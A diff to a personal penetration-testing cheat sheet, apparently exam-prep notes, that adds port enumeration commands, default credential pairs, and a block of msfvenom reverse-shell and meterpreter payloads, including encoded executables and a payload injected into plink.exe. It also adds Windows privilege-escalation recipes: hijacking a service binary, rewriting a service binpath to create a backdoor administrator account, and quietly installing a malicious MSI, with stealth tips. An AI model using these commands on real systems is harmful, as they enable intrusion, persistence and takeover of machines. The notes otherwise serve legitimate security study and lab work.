@@ -122,8 +122,16 @@ openssl s_client -connect $tgt:443
 By Port
 Start breaking tools down by port/protocol/service
 ****************************************************
+# Example of finding an nmap script and learning how to use it:
+# smtp?
+ls /usr/share/nmap/scripts/*smtp*
+
+# See what you want and most likely the author explains how to use it
+less /usr/share/nmap/scripts/smtp-enum-users.nse
+
 -------------------------------------------
 21- ftp
+# Look for: OS version, FTP Version, misconfigured permissions (whole hd?)
 
 ftp $tgt
 nc -nvv $tgt 21
@@ -131,6 +139,7 @@ nmap --script=
 
 -------------------------------------------
 22 - ssh
+# Look for: SSH Version (hint at OS?)
 
 ssh root@$tgt
 nc -nvv $tgt 22
@@ -140,25 +149,37 @@ nmap --script=
 
 -------------------------------------------
 23 - telnet
+# Look for: Version (hint at OS?)
 
 telnet root@$tgt
 nmap --script=
 
 -------------------------------------------
 25 - smtp
+# Look for Version, User enumeration
 
+echo -e "VRFY root \r" | nc -nv 10.11.1.215 25
+for name in $(cat userlist.txt); do echo -e "VRFY root \r" | nc -nv $tgt 25; done
+
+nmap --script=/usr/share/nmap/scripts/smtp-enum-users.nse
 
 -------------------------------------------
 53 - DNS
+# Look for: Version (hint at OS and infrastructure), Zone XFR
 
 
 -------------------------------------------
 80 - http
+# Look for:  Webserver version (Apache 2.34 etc.) AND Web Application Version (WordPress?), Server date time, Options allowed
 amap $tgt 80
 nikto -host $tgt -port $tgtPort
+curl -v http://$tgt/webpage
+echo -e "HEAD / HTTP/1.1 \r" |nc -nvv $tgt 80
 
 -------------------------------------------
 161 - snmp
+# Look for:  If this pops it dumps a TON of OS info and user info
+# Can also allow you to WRITE configs into the device... looking at you Cisco
 
 snnpwalk ???
 snmpcheck ???
@@ -289,9 +310,21 @@ WORDPRESS
 
 # WP Scanner
 ??
+==========================================================================================
+				DEF CREDS - Try font door anytime you find it
+==========================================================================================
+Wordpress
+admin admin
+
+vsFTPd 2.3.4
+anonymous
+*blank*
+
+ORACLE isql
+SYSTEM SYSTEM
 
 ============================================================================================
-				SHELLS
+				                    SHELLS
 ============================================================================================
 ##nc shell upgrade to /bin/bash/
 python -c "import pty;pty.spawn('/bin/bash');"
@@ -300,7 +333,7 @@ python -c "import pty;pty.spawn('/bin/bash');"
 
 
 ============================================================================================
-					MSF VENOM
+					            MSF VENOM
 ============================================================================================
 A great cheat sheet: https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/
 
@@ -382,6 +415,30 @@ msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
 # Veil evasion
 
 # ? what else?
+
+----------------------------------- More Advanced Venom Examples --------------------------------------------
+#  Exit THREAD instead of a Process to leave a door open (example bind shell)
+
+msfvenom -p linux/x86/meterpreter_reverse_tcp -f elf LHOST=$me LPORT=9835 > linuxmetrpr.elf
+
+msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=$me LPORT=443 > nonstaged.elf
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$me LPORT=443 > metrev443.elf
+
+msfvenom -p linux/x86/shell_reverse_tcp -f c -b "\x00\x0a\x0d" LHOST=$me LPORT=9874 EXITFUNC=thread
+
+#inject a payload into an PE
+msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x ./plink.exe -o plinkevil443.exe
+
+msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f jsp > rev443.jsp
+
+msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f asp > shellrev443.asp
+
+msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shellrev443.exe
+
+msfvenom -p windows/meterpreter/reverse_http LHOST=$me LPORT=80 -f exe -e x86/shikata_ga_nai -i 14 -o metrevhttp80.exe
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$me LPORT=53 -f exe -e x86/shikata_ga_nai -i 9 -o metrev53.exe
 
 ============================================================================================
 					WINDOWS COMMAND LINE STUFF
@@ -780,6 +837,73 @@ Source: https://toshellandback.com/2015/11/24/ms-priv-esc/
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
 
 # icacls will tell you if you have permissions to write there....
+# Example of a service identified with wmic- C:\Program Files (x86)\Privacyware\Privatefirewall 7.0\pfsvc.exe
+icacls "C:\Program Files (x86)\Privacyware"
+
+# BUILTIN\Users:(OI)(CI)(M) <--- the M means modifiable
+
+# Drop a payload of the same name
+msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o Privatefirewall.exe
+
+# Now restart the service to trigger the path hijack
+sc stop PFNet
+sc start PFNet
+
+# Keep in mind you may not always have perms to restart the service manually, and will need to wait for a reboot (or cause one another way...)
+
+--------- OPTION 2: Unsecure Service Bin Locations ---------------
+# The easiest way to hunt for these vulnerable services is to use Accesschk
+# Accesschk is part of the SysInternals sweet and less likely to get flagged
+
+# Look for:  Services that allow SERVICE_ALL_ACCESS.  This would indicate that the Authenitcated User (read non-priveleged)
+# has access to the service bins.
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+
+# Now look at the properties of that service
+sc qc some-misconfigured-service
+
+# The BINARY PATH_NAME here is what we are cheating... since we can change the value we can just change it to a command
+sc config PFNET binpath= "net user rottenadmin P@ssword123! /add"
+sc stop PFNET
+sc start PFNET
+sc config PFNET binpath= "net localgroup Administrators rottenadmin /add"
+sc stop PFNET
+sc start PFNET
+
+# Voila - pwned
+# RED TEAM NOTE:  This is noisy if they are looking for it.... it will be throwing error codes every time the Service is restarted
+# and is pointing at something other than the service BIN.  Once you're done you should kick this bin back to the legit service name to 
+# reduce noise on the target.
+
+------- Option 3: AlwaysInstallElevated -------------------------
+# [HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]
+# “AlwaysInstallElevated”=dword:00000001 
+# 
+# [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
+# “AlwaysInstallElevated”=dword:00000001
+# 
+# If these 2 keys are set to 1 we are in business...
+#
+# Check it, fool.  Look for a value of 0x1
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Error messages may simply indicate GPO never set the key for AlwaysInstallElevated
+# But if it was set to Yes (0x1)...
+msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
+msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
+
+# MSI Exec Explanations...
+# /quiet = Suppress any messages to the user during installation
+# /qn = No GUI
+# /i = Regular (vs. administrative) installation
+
+# RED TEAM NOTE:  Malicious MSI Files are meant to fail... its stealthier this way because the failed install 
+# won't register with the vitim  system
+# exploit/windows/local/always_install_elevated has an advanced setting Quiet.. set it for similar
+# behavior of /quiet in the MISEXEC command
+
+---------- Option 4: Unattended Installs -----------------------
 
 
 
@@ -1159,42 +1283,8 @@ john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
 
 #Caracking HTTP
 medusa -h $tgt -n 9505 -u bethany -P mutated.txt -M http -m DIR:/~Public -T 10
-==========================================================================================
-				DEF CREDS
-==========================================================================================
-Wordpress
-admin admin
 
-vsFTPd 2.3.4
-anonymous
-*blank*
 
-ORACLE isql
-SYSTEM SYSTEM
-
-==========================================================================================
-				VENOM PACKAGES
-==========================================================================================
-msfvenom -p linux/x86/meterpreter_reverse_tcp -f elf LHOST=$me LPORT=9835 > linuxmetrpr.elf
-
-msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=$me LPORT=443 > nonstaged.elf
-
-msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$me LPORT=443 > metrev443.elf
-
-msfvenom -p linux/x86/shell_reverse_tcp -f c -b "\x00\x0a\x0d" LHOST=$me LPORT=9874 EXITFUNC=thread
-
-#inject a payload into an PE
-msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x ./plink.exe -o plinkevil443.exe
-
-msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f jsp > rev443.jsp
-
-msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f asp > shellrev443.asp
-
-msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shellrev443.exe
-
-msfvenom -p windows/meterpreter/reverse_http LHOST=$me LPORT=80 -f exe -e x86/shikata_ga_nai -i 14 -o metrevhttp80.exe
-
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$me LPORT=53 -f exe -e x86/shikata_ga_nai -i 9 -o metrev53.exe
 ==========================================================================================
 				IP TABLES
 ==========================================================================================
